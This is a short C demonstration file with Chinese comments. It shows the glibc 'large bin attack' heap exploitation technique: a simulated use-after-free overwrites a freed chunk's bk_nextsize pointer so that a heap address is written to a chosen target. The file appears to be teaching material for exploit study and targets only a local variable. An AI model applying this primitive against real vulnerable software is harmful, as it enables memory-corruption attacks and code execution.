/**
 *  漏洞名称： large bin attack
 *  适用版本： glibc-2.23 ~ glibc-2.39
 *  漏洞危害： 将任意地址写入堆地址
 *  复现环境： Ubuntu 22.04
 *  编译命令： gcc -g large_bin_attack.c -o large_bin_attack
 */

/**
 *  利用条件：存在UAF漏洞
 *  利用思路: 将一块较大的chunk放入large bin中，并修改其bk_nextsize为目标地址-0x20
 *            然后将一块较小的chunk放入large bin中即可触发large bin attack，修改目标地址为较小的chunk的地址
 */
#define DEMO
#include <demo.h>

u64 target = 0x12345678;

int main()
{
    printf("1.分配出两个可以放入相同large bin中的一小一大两个chunk1, chunk2\n");
    u64 chunk1 = MALLOC(0x410);
    MALLOC(0x10);
    u64 chunk2 = MALLOC(0x420);
    MALLOC(0x10);

    printf("2.将较大的 chunk2 放入large bin中\n");
    FREE(chunk2);
    MALLOC(0x430);

    printf("3.利用UFA修改chunk2的bk_nextsize = target - 0x20\n");
    SET_ADDR_OFFSET_VALUE_OFFSET(chunk2, 0x18, &target, -0x20);

    printf("4.将较小的 chunk1 放入large bin中即可触发large bin attack\n");
    FREE(chunk1);
    MALLOC(0x430);

    PUT(target);
    PUT_VALUE("chunk1", chunk1 - 0x10);

    assert(GET_VALUE(chunk1 - 0x10) == target);

    return 0;
}
